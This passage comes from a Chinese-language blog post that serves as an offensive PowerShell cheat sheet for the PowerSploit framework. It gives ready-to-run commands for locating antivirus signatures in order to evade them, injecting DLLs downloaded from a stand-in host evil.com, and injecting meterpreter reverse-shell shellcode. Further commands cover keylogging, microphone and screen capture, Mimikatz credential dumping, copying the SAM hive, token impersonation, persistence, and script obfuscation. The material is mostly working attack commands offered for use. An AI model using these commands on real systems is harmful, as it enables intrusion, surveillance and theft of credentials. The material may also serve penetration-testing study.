<h2 id="0x03-利用框架"><a href="#0x03-利用框架" class="headerlink" title="0x03 利用框架"></a>0x03 利用框架</h2><h3 id="1-PowerSploit"><a href="#1-PowerSploit" class="headerlink" title="1. PowerSploit"></a>1. PowerSploit</h3><h4 id="Find-AVSignature"><a href="#Find-AVSignature" class="headerlink" title="Find-AVSignature"></a>Find-AVSignature</h4><p>寻找反病毒软件特征码，思路类似于二分法</p>
<pre class="language-none"><code class="language-none"># 假设远控文件偏移范围为0~10000
Find-AVSignature -StartByte 0 -EndByte 10000 -Interval 5000 -Path test.exe

# 重复步骤
Find-AVSignature -StartByte 5001 -EndByte 10000 -Interval 2500 -Path test.exe</code></pre>

<p><em>refer:</em> <a target="_blank" rel="noopener" href="http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html">http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html</a></p>
<h4 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h4><pre class="language-none"><code class="language-none">1) Invoke-DLLInjection

    DLL注入脚本，dll架构要与目标进程相符，同时要具备相应的权限

    Invoke-DLLInjection -ProcessID 2366 -dll test.dll

2）Invoke-ReflectivePEInjection

    反射型注入，能做到不在目标磁盘上留下文件

    Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;evil.com&#x2F;test.dll -ProcId 2326  # 下载dll并注入到id为2326的进程中

    Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;evil.com&#x2F;test.dll -ProcId 2326 -ForceASLR  # 强制使用ASLR

    Invoke-ReflectivePEInjection -PEPath test.dll  # 从本地加载dll并注入指定进程

    Invoke-ReflectivePEInjection -PEPath test.dll  # 向exe传参

3）Invoke-Shellcode

    向目标进程注入shellcode

    msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.10.1 lport&#x3D;6666 -f powershell  # 生成shellcode

    Invoke-Shellcode -Shellcode @($buf) -Force  # 注入shellcode

4）Invoke-WmiCommand

    在目标主机使用wmi执行命令

    $username &#x3D; &quot;test\Administrator&quot;
    $password &#x3D; echo &quot;123456&quot; | ConvertTo-SecureString -AsPlainText -Force
    $c &#x3D; New-Object System.Management.Automation.PSCredential $username,$password

    Invoke-Wmicommand -Payload &#123; 1 + 1 &#125; -ComputerName &#39;192.168.10.1&#39; -Credential $Credentials</code></pre>

<h4 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h4><pre class="language-none"><code class="language-none">Get-GPPAutologon

Get-GPPPassword

Get-Keystrokes -LogPath .\keylog.txt  # 键盘记录

Get-MicrophoneAudio -Path .\audio.wav -Length 10  # 通过麦克风记录声音

Get-TimedScreenshot -Path .\screenshot\ -Interval 10 -EndTime 18:00  # 屏幕记录

Get-VaultCredential  # 从凭证管理器中获取凭证

Invoke-CredentialInjection -UserName test -Password 123456 -NewWinLogon

Invoke-Mimikatz -DumpCreds

invoke-mimikatz -Command &quot;Privilege::Debug Sekurlsa::logonpasswords&quot;  # 执行mimikaz命令

Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM.hive  # 某些文件被其他进程占用导致不能复制时时使用，如dump SAM文件

Invoke-TokenManipulation -Enumerate  # 枚举唯一可用的令牌

Invoke-TokenManipulation -ShowAll   # 枚举所有的令牌

Invoke-TokenManipulation -CreateProcess &quot;calc.exe&quot; -Username &quot;NT AUTHORITY\SYSTEM&quot;  # 使用SYSTEM用户的令牌创建一个进程

Invoke-TokenManipulation -CreateProcess &quot;calc.exe&quot; -ProcessId &quot;2366&quot;  # 通过ID来指定一个Token

Invoke-TokenManipulation -ImpersonateUser -Username &quot;nt authority\system&quot;  # 使用当前的线程令牌模仿SYSTEM用户

Out-Minidump -Process (Get-Process -Id 2345) -DumpFilePath .\   # dump指定进程完整的内存镜像

Get-VolumeShadowCopy  # 列出所有卷影拷贝的路径，需要管理员权限

New-VolumeShadowCopy -Volume C:\  # 新建卷影拷贝

Mount-VolumeShadowCopy -Path C:\Users\admin -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  # 挂载卷影拷贝

Remove-VolumeShadowCopy -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  # 删除卷影拷贝</code></pre>

<h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4><p>存放位置：放在<code>%Systemroot%/System32\WindowsPowerShell\v1.0\Modules</code> 或 <code>$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules</code></p>
<pre class="language-none"><code class="language-none">$ElevatedOptions &#x3D; New-ElevatedPersistenceOption  -PermanentWMI -Daily -At &#39;2 PM&#39;
$UserOptions &#x3D; New-UserPersistenceOption -Registry -AtLogon
Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions</code></pre>

<h4 id="Privesc"><a href="#Privesc" class="headerlink" title="Privesc"></a>Privesc</h4><p><strong>Get-System</strong></p>
<pre class="language-none"><code class="language-none">get-system -Technique namedpipe&#x2F;token  # 选择方式

Get-System -RevToSelf  # 恢复令牌</code></pre>

<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h4><pre class="language-none"><code class="language-none">Get-ComputerDetails  #获取计算机信息

Get-HttpStatus -Target www.example.com -Path C:\dic.txt -UseSSL  # 扫目录脚本

Invoke-Portscan -Hosts 192.168.1,1 -Ports &quot;135,139,445,1&quot; -Threads 50  # 扫描192.168.1.1&#x2F;24的135,139,445端口

Invoke-Portscan -Hosts 192.168.1.1 -TopPorts 50 -Threads 50  # 扫描Top50的端口

Invoke-Portscan -Hosts 192.168.169.168 -Ports 445 -SkipDiscovery  # 扫描前不ping目标主机

Invoke-ReverseDnsLookup -IpRange 192.168.1.1-192.168.1.254  # ip反查主机名</code></pre>

<h4 id="ScriptModification"><a href="#ScriptModification" class="headerlink" title="ScriptModification"></a>ScriptModification</h4><pre class="language-none"><code class="language-none">Out-CompressedDll -FilePath test.dll   # 将dll压缩并base64编码

Out-EncodedCommand -ScriptBlock &#123;write-host &#39;whoami&#39;&#125;  # 脚本块编码

Out-EncodedCommand -Path .\1.ps1 -WindowStyle Hidden   # 脚本编码

Out-EncryptedScript -ScriptPath .\1.ps1 -Password fuck -Salt 123 -FilePath .\encrypt.ps1  # 脚本加密

Remove-Comments -ScriptBlock &#123; whoami &#125;   # 删除空白符</code></pre>

<h3 id="2-Nishang"><a href="#2-Nishang" class="headerlink" title="2. Nishang"></a>2. Nishang</h3><h3 id="3-Empire"><a href="#3-Empire" class="headerlink" title="3. Empire"></a>3. Empire</h3><h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/powershell/">https://learn.microsoft.com/zh-cn/powershell/</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters">https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters</a></li>
<li><a target="_blank" rel="noopener" href="https://rootclay.gitbook.io/powershell-attack-guide/">https://rootclay.gitbook.io/powershell-attack-guide/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/wiki">https://github.com/EmpireProject/Empire/wiki</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Windows/" rel="tag" <i class="fa fa-tag"></i> Windows</a>
              <a href="/tags/PowerShell/" rel="tag" <i class="fa fa-tag"></i> PowerShell</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/88661/" rel="prev" title="Windows 载荷投递姿势">
                  <i class="fa fa-chevron-left"></i> Windows 载荷投递姿势
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/50056/" rel="next" title="Java RCE漏洞利用篇">
                  Java RCE漏洞利用篇 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
